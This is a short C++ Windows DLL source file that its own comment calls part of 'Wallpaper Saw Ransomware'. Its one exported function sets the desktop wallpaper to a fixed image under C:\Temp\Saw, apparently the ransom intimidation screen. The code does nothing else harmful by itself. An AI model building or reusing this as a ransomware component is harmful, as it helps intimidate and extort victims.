// DLL for the Wallpaper Saw Ransomware... Enjoy!!! :D
#include "pch.h"
#include <Windows.h>


EXTERN_C
{
    _declspec(dllexport) int _cdecl SetWallpaperSaw() 
    {
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)"C:\\Temp\\Saw\\SawWallpaper.jpg", SPIF_UPDATEINIFILE);
        return GetLastError();
        return 0;
    }
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

